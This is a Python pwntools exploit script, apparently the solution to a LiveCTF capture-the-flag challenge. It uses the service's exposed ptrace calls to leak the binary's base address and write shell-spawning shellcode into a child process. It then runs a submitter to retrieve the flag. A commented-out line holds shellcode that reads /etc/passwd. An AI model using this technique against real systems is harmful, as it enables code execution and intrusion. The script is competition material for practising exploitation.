#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.arch = "amd64"

p = remote(HOST, int(PORT))

def another():
	if b"another" in p.recvline():
		p.sendline(b"1")

def write(where, what):
	another()
	p.sendline(hex(constants.PTRACE_POKETEXT).encode())
	p.sendlineafter(b"want?", hex(where).encode())
	p.sendlineafter(b"data?", hex(what).encode())
	p.recvuntil(b"ptrace returned 0x0\n")

def read_reg(i):
	another()
	p.sendline(hex(constants.PTRACE_PEEKUSER).encode())
	p.sendlineafter(b"want?", hex(i*8).encode())
	p.sendlineafter(b"data?", b"0")
	p.recvline()
	return int(p.recvline().split()[2], 16)

def continue_child():
	another()
	p.sendline(hex(constants.PTRACE_CONT).encode())
	p.sendlineafter(b"want?", b"0")
	p.sendlineafter(b"data?", hex(constants.SIGCONT).encode())


elf_address = read_reg(1) - 0x3D68
print(hex(elf_address))
assert (elf_address & 0xFFF) == 0

# shellcode = shellcraft.cat(b"/etc/passwd") + shellcraft.exit(0)
shellcode = shellcraft.sh() + shellcraft.exit(0)
shellcode = asm(shellcode)

child_ret_addr = elf_address + 0x13b8
for i in range(0, len(shellcode), 8):
	write(child_ret_addr + i, u64(shellcode[i:i+8].ljust(8, b"\x00")))

continue_child()

p.recvuntil(b"another")
p.sendline(b"0")

p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)